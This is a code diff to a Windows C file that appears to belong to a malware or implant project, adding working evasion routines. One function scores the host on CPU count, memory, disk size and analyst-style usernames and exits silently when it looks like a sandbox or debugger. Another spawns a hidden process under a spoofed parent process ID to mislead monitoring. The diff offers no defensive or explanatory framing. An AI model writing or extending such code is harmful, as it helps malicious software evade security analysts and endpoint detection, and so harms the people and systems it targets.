@@ -1,6 +1,13 @@
 #include <windows.h>
+#include <tlhelp32.h>
 #include <string.h>
+#include <ctype.h>
 #include "evasion.h"
+#include "api_resolve.h"
+
+#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
+#endif
 
 
 typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -40,6 +47,115 @@ static void find_text(void) {
             return;
         }
     }
+}
+
+/* ── Sandbox / analysis environment detection ──────────────────────────────
+ * Score-based: exits silently if score >= 4.  Called before evasion_init().
+ */
+void sandbox_check(void) {
+    if (IsDebuggerPresent()) ExitProcess(0);  /* immediate */
+
+    int score = 0;
+
+    /* CPU count */
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    if (si.dwNumberOfProcessors < 2) score++;
+
+    /* RAM */
+    MEMORYSTATUSEX ms;
+    ms.dwLength = sizeof(ms);
+    if (GlobalMemoryStatusEx(&ms)) {
+        if (ms.ullTotalPhys < (ULONGLONG)512  * 1024 * 1024) score += 3;
+        else if (ms.ullTotalPhys < (ULONGLONG)1024 * 1024 * 1024) score++;
+    }
+
+    /* Disk C: */
+    ULARGE_INTEGER totalBytes;
+    totalBytes.QuadPart = 0;
+    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL))
+        if (totalBytes.QuadPart < (ULONGLONG)40 * 1024 * 1024 * 1024) score++;
+
+    /* Username */
+    char username[128] = {0};
+    DWORD u_sz = sizeof(username);
+    GetUserNameA(username, &u_sz);
+    char low_u[128] = {0};
+    for (int i = 0; username[i] && i < 127; i++)
+        low_u[i] = (char)tolower((unsigned char)username[i]);
+    const char *bad[] = {"sandbox","malware","virus","analyst","cuckoo","maltest","vmuser","tequilaboomboom"};
+    for (int i = 0; i < 8; i++)
+        if (strstr(low_u, bad[i])) { score += 3; break; }
+
+    if (score >= 4) ExitProcess(0);
+}
+
+/* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
+int spawn_with_ppid(const char *cmd, const char *parent_name) {
+    /* Find the parent PID by process name */
+    DWORD parent_pid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(pe);
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            char narrow[MAX_PATH] = {0};
+            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, narrow, sizeof(narrow)-1, NULL, NULL);
+            char lo[MAX_PATH] = {0}, lp[MAX_PATH] = {0};
+            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++) lo[i] = (char)tolower((unsigned char)narrow[i]);
+            for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++) lp[i] = (char)tolower((unsigned char)parent_name[i]);
+            if (strcmp(lo, lp) == 0) { parent_pid = pe.th32ProcessID; break; }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    if (!parent_pid) return 0;
+
+    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
+    if (!hParent) return 0;
+
+    SIZE_T attr_sz = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_sz);
+    if (!attrList) { CloseHandle(hParent); return 0; }
+
+    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
+        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
+    }
+    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent, sizeof(hParent), NULL, NULL);
+
+    STARTUPINFOEXW siEx;
+    ZeroMemory(&siEx, sizeof(siEx));
+    siEx.StartupInfo.cb = sizeof(siEx);
+    siEx.lpAttributeList = attrList;
+
+    int wcmd_len = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
+    WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
+    if (!wcmd) {
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
+    }
+    MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wcmd_len);
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
+        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        NULL, NULL, &siEx.StartupInfo, &pi);
+
+    HeapFree(GetProcessHeap(), 0, wcmd);
+    DeleteProcThreadAttributeList(attrList);
+    HeapFree(GetProcessHeap(), 0, attrList);
+    CloseHandle(hParent);
+    if (!ok) return 0;
+
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 1;
 }
 
 void evasion_init(void) {
